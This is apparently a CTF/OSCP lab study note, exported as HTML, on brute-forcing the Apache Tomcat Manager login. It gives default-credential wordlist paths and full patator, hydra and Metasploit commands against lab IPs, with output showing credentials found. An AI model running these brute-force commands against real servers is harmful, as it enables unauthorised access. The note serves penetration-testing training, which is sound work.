<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Manager Panel - Bruteforce</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Manager Panel - Brute force</h1></strong><br /><code>/manager/html</code> requires authentication via a HTTP GET request.<br />There are plenty of default username/passwords for Apache Tomcat, so they&#39;re worth trying.<br /><br /><strong>### Default credentials wordlists</strong><br /><code>/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt<br />/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt<br />/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt<br />/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt</code><br /><br /><strong><h2>## patator</h2></strong><br />Wordlist = <code>/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt</code><br /><div class="codebox"><div class="codebox">┌─[root@parrot]─[/oscp/10.11.1.209]<br />└──╼&nbsp;#patator&nbsp;http_fuzz&nbsp;url=http://10.11.1.209:8080/manager/html&nbsp;user_pass=COMBO00:COMBO01&nbsp;0=/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt&nbsp;-x&nbsp;ignore:code=401<br />14:48:50&nbsp;patator&nbsp;&nbsp;&nbsp;&nbsp;INFO&nbsp;-&nbsp;Starting&nbsp;Patator&nbsp;v0.7&nbsp;(https://github.com/lanjelot/patator)&nbsp;at&nbsp;2019-12-02&nbsp;14:48&nbsp;GMT<br />14:48:50&nbsp;patator&nbsp;&nbsp;&nbsp;&nbsp;INFO&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;<br />14:48:50&nbsp;patator&nbsp;&nbsp;&nbsp;&nbsp;INFO&nbsp;-&nbsp;code&nbsp;size:clen&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time&nbsp;|&nbsp;candidate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;num&nbsp;|&nbsp;mesg<br />14:48:50&nbsp;patator&nbsp;&nbsp;&nbsp;&nbsp;INFO&nbsp;-&nbsp;----<br />14:48:52&nbsp;patator&nbsp;&nbsp;&nbsp;&nbsp;INFO&nbsp;-&nbsp;200&nbsp;&nbsp;13583:-1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.377&nbsp;|&nbsp;tomcat:tomcat&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;75&nbsp;|&nbsp;HTTP/1.1&nbsp;200&nbsp;OK<br />14:48:52&nbsp;patator&nbsp;&nbsp;&nbsp;&nbsp;INFO&nbsp;-&nbsp;Hits/Done/Skip/Fail/Size:&nbsp;3/79/0/0/79,&nbsp;Avg:&nbsp;37&nbsp;r/s,&nbsp;Time:&nbsp;0h&nbsp;0m&nbsp;2s</div></div><br /><br /><strong><h2>## hydra</h2></strong><br /><code>-s</code> for port<br /><code>admin/admin</code> consistently appears, but doesn&#39;t necessarily work.<br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/jerry#&nbsp;hydra&nbsp;-L&nbsp;/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt&nbsp;-P&nbsp;/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt&nbsp;-s&nbsp;8080&nbsp;10.10.10.95&nbsp;http-get&nbsp;/manager/html<br />Hydra&nbsp;v8.9.1&nbsp;(c)&nbsp;2019&nbsp;by&nbsp;van&nbsp;Hauser/THC&nbsp;-&nbsp;Please&nbsp;do&nbsp;not&nbsp;use&nbsp;in&nbsp;military&nbsp;or&nbsp;secret&nbsp;service&nbsp;organizations,&nbsp;or&nbsp;for&nbsp;illegal&nbsp;purposes.<br /><br />Hydra&nbsp;(https://github.com/vanhauser-thc/thc-hydra)<br />[DATA]&nbsp;max&nbsp;16&nbsp;tasks&nbsp;per&nbsp;1&nbsp;server,&nbsp;overall&nbsp;16&nbsp;tasks,&nbsp;42&nbsp;login&nbsp;tries&nbsp;(l:6/p:0),&nbsp;~7&nbsp;tries&nbsp;per&nbsp;task<br />[DATA]&nbsp;attacking&nbsp;http-get://10.10.10.95:8080/manager/html<br />[8080][http-get]&nbsp;host:&nbsp;10.10.10.95&nbsp;&nbsp;&nbsp;login:&nbsp;admin&nbsp;&nbsp;&nbsp;password:&nbsp;admin<br />[8080][http-get]&nbsp;host:&nbsp;10.10.10.95&nbsp;&nbsp;&nbsp;login:&nbsp;tomcat&nbsp;&nbsp;&nbsp;password:&nbsp;s3cret<br />1&nbsp;of&nbsp;1&nbsp;target&nbsp;successfully&nbsp;completed,&nbsp;2&nbsp;valid&nbsp;passwords&nbsp;found<br />Hydra&nbsp;(https://github.com/vanhauser-thc/thc-hydra)&nbsp;finished</div></div><br /><br /><strong><h2>## Metasploit&#39;s </h2></strong><strong><code><h2>tomcat_mgr_login</h2></code></strong><br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/jerry/exploits#&nbsp;msfconsole&nbsp;-q<br />msf5&nbsp;auxiliary(admin/http/tomcat_administration)&nbsp;&gt;&nbsp;use&nbsp;auxiliary/scanner/http/tomcat_mgr_login<br />msf5&nbsp;auxiliary(scanner/http/tomcat_mgr_login)&nbsp;&gt;&nbsp;set&nbsp;RHOSTS&nbsp;10.10.10.95<br />msf5&nbsp;auxiliary(scanner/http/tomcat_mgr_login)&nbsp;&gt;&nbsp;set&nbsp;VERBOSE&nbsp;no<br />msf5&nbsp;auxiliary(scanner/http/tomcat_mgr_login)&nbsp;&gt;&nbsp;run<br /><br />[+]&nbsp;10.10.10.95:8080&nbsp;-&nbsp;Login&nbsp;Successful:&nbsp;tomcat:s3cret<br />[*]&nbsp;Scanned&nbsp;1&nbsp;of&nbsp;1&nbsp;hosts&nbsp;(100%&nbsp;complete)<br />[*]&nbsp;Auxiliary&nbsp;module&nbsp;execution&nbsp;completed</div></div><br /></div>
</body>
</html>
